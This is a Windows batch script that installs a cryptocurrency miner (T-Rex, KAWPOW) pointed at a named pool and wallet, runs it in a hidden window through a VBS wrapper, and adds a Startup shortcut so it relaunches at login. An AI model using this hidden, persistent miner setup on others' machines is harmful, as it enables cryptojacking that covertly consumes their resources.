@echo off
setlocal

:: Define paths (using C:\Miner instead of %APPDATA%)
set "MINER_DIR=C:\Miner"
set "MINER_SCRIPT=%MINER_DIR%\miner.bat"
set "VBS_SCRIPT=%MINER_DIR%\run_hidden.vbs"
set "T_REX_EXEC=%MINER_DIR%\t-rex.exe"
set "STARTUP_SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\miner.lnk"

:: Create miner directory
mkdir "%MINER_DIR%" 2>nul

:: Check if t-rex.exe exists, if not, prompt user to place it in C:\Miner
if not exist "%T_REX_EXEC%" (
    echo ERROR: t-rex.exe not found! Please place t-rex.exe in C:\Miner
    exit /b
)

:: Write miner script (ensuring absolute path)
(
    echo @echo off
    echo cd /d "%MINER_DIR%"
    echo :loop
    echo ping -n 1 1.1.1.1 ^>nul || (timeout /t 5 >nul & goto loop)
    echo start /b "" "%T_REX_EXEC%" -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe
) > "%MINER_SCRIPT%"

:: Write VBS script to run miner in hidden mode
(
    echo Set WshShell = CreateObject("WScript.Shell")
    echo WshShell.Run """%MINER_SCRIPT%""", 0, False
) > "%VBS_SCRIPT%"

:: Create a startup shortcut that runs the VBS script
powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%STARTUP_SHORTCUT%'); $s.TargetPath='wscript.exe'; $s.Arguments='""%VBS_SCRIPT%""'; $s.Save()"

:: Run miner immediately
wscript "%VBS_SCRIPT%"

exit
